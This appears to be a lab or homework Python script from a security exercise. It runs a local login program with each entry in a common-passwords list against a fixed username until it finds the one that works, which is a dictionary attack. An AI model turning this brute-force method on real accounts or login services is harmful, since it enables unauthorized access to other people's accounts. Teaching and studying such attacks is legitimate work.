import subprocess
from datetime import datetime

def try_passwords(username, passwords):
    for password in passwords:
        output = subprocess.run(["python3", "Q1/Login.pyc", username, password], capture_output=True, text=True)
        if "Login successful" in output.stdout:
            return password

if __name__ == "__main__":
    with open("Q1/MostCommonPWs", "r") as f:
        passwords = f.read().split()

    print(f"Start time: {datetime.now()}\n")

    username = "SkyRedFalcon914"
    password = try_passwords(username, passwords)
    if password is None:
        print(f"{username}: Failed to find password.")
    else:
        print(f"{username}: {password}")

    print(f"\nEnd time: {datetime.now()}")
